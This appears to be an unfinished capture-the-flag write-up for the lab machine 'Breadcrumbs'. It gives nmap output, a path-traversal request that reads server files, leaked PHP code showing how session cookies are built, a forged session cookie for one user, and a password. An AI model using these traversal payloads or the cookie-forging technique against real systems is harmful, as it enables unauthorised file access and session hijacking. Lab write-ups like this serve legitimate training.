
# Beardcrumbs
IP : 10.10.10.228
OS : windows

## Recon
nmap scan 
```bash
nmap -sV -sC -p- -oA nmap breadcrumbs.htb
```
nmap output 

```bash
Nmap scan report for breadcrumbs.htb (10.10.10.228)  
Host is up (0.032s latency).  
Not shown: 65520 closed ports  
PORT      STATE SERVICE       VERSION  
22/tcp    open  ssh           OpenSSH for\_Windows\_7.7 (protocol 2.0)  
| ssh-hostkey:  
|   2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)  
|   256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)  
|\_  256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)  
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)  
| http-cookie-flags:  
|   /:  
|     PHPSESSID:  
|\_      httponly flag not set  
|\_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1  
|\_http-title: Library  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
443/tcp   open  ssl/ssl       Apache httpd (SSL-only mode)  
| http-cookie-flags:  
|   /:  
|     PHPSESSID:  
|\_      httponly flag not set  
|\_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1  
|\_http-title: Library  
| ssl-cert: Subject: commonName=localhost  
| Not valid before: 2009-11-10T23:48:47  
|\_Not valid after:  2019-11-08T23:48:47  
|\_ssl-date: TLS randomness does not represent time  
| tls-alpn:  
|\_  http/1.1  
445/tcp   open  microsoft-ds?  
3306/tcp  open  mysql?  
| fingerprint-strings:  
|   NULL:  
|\_    Host '10.10.14.200' is not allowed to connect to this MariaDB server  
5040/tcp  open  unknown  
7680/tcp  open  pando-pub?  
49664/tcp open  msrpc         Microsoft Windows RPC  
49665/tcp open  msrpc         Microsoft Windows RPC  
49666/tcp open  msrpc         Microsoft Windows RPC  
49667/tcp open  msrpc         Microsoft Windows RPC  
49668/tcp open  msrpc         Microsoft Windows RPC  
49669/tcp open  msrpc         Microsoft Windows RPC  
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :  
SF-Port3306-TCP:V=7.91%I=7%D=5/11%Time=609A33A7%P=x86\_64-pc-linux-gnu%r(NU  
SF:LL,4B,"G\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.200'\\x20is\\x20not\\x20allo  
SF:wed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server");  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```


Lets start by looking at the web service. the HTTP and HTTPS is the same web service.
Very simple web service which allows up to look up book by title or author. 
Start up burp and lets look at how the request to the service look like. 
We see the post request made to the service

```html
title=te&author=&method=0
```

Lets try and edit this request

After a bit of playing around i found this request
Changing the request to the method above allow us to read files on the web services.
```html
book=../index.php&method=1
```

 Lets see if we can find anything of value. 

```html
HTTP/1.1 200 OK
Date: Tue, 11 May 2021 08:33:48 GMT
Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
X-Powered-By: PHP/8.0.1
Content-Length: 220
Connection: close
Content-Type: text/html; charset=UTF-8

<br />
<b>Warning</b>:  file_get_contents(../books/../php.conf): Failed to open stream: No such file or directory in <b>C:\Users\www-data\Desktop\xampp\htdocs\includes\bookController.php</b> on line <b>28</b><br />
false
```

Look at the response we get an idea of the folder structure. 
We are currently acting as www-data user and the bookController.php directory path. 

```html
book=../portal/cookie.php&method=1
```

I find a directory called portal,here we can go to cookie.php 
```php
<?php\\r\\n\\/\*\*\\r\\n \* @param string $username  Username requesting session cookie\\r\\n \* \\r\\n \* @return string $session\_cookie Returns the generated cookie\\r\\n \* \\r\\n \* @devteam\\r\\n \* Please DO NOT use default PHPSESSID; our security team says they are predictable.\\r\\n \* CHANGE SECOND PART OF MD5 KEY EVERY WEEK\\r\\n \* \*\\/\\r\\nfunction makesession($username){\\r\\n    $max = strlen($username) - 1;\\r\\n    $seed = rand(0, $max);\\r\\n    $key = \\"s4lTy\_stR1nG\_\\".$username\[$seed\].\\"(!528.\\/9890\\";\\r\\n    $session\_cookie = $username.md5($key);\\r\\n\\r\\n    return $session\_cookie;\\r\\n}"
go there and create a new user.
```


Paul phpsessid
```php
paul47200b180ccd6835d25d034eeb6e6390
```


writeups : Password: p@ssw0rd!@#$9890./
https://fdlucifer.github.io/2021/02/23/breadcrumbs/